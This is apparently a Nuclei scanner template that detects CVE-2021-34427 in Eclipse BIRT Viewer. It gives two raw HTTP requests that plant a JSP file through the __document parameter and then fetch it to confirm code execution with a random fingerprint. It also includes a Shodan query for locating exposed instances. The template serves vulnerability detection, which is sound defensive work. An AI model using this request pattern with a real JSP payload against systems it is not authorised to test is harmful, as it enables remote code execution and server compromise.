flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body_1, "The report document file has been generated successfully.")
    - contains(body_2, "{{fingerprint}}")
    - contains(header_2, "text/html")
    type: dsl
  raw:
  - 'GET /document?__report=test.rptdesign&sample={{url_encode(payload)}}&__document=./test/{{filename}}.jsp/.
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /test/{{filename}}.jsp HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-34427
info:
  author: us3r777,Synacktiv
  classification:
    cpe: cpe:2.3:a:eclipse:business_intelligence_and_reporting_tools:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-34427
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
    epss-percentile: 0.9897
    epss-score: 0.78243
  description: 'Eclipse BIRT versions 4.8.0 and earlier contain a JSP injection caused
    by query parameters, letting remote attackers create and access malicious JSP
    files in the viewer directory, exploit requires sending crafted query parameters.

    '
  impact: 'Unauthenticated attackers can create and access malicious JSP files via
    JSP injection, achieving remote code execution and complete server compromise.

    '
  metadata:
    max-request: 2
    product: business_intelligence_and_reporting_tools
    shodan-query: http.title:"eclipse birt home"
    vendor: vendor
    verified: true
  name: Eclipse BIRT Viewer - Remote Code Execution
  reference:
  - https://bugs.eclipse.org/bugs/show_bug.cgi?id=538142
  - https://sec-consult.com/vulnerability-lab/advisory/remote-code-execution-bypass-eclipse-business-intelligence-reporting-birt/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-34427
  remediation: 'Upgrade to Eclipse BIRT version 4.9.0 or later.

    '
  severity: critical
  tags: cve,cve2021,birt,rce,file-upload,intrusive,vuln,vkev
variables:
  filename: '{{rand_base(20)}}'
  fingerprint: '{{rand_base(20)}}'
  payload: <%out.println("{{fingerprint}}");%>
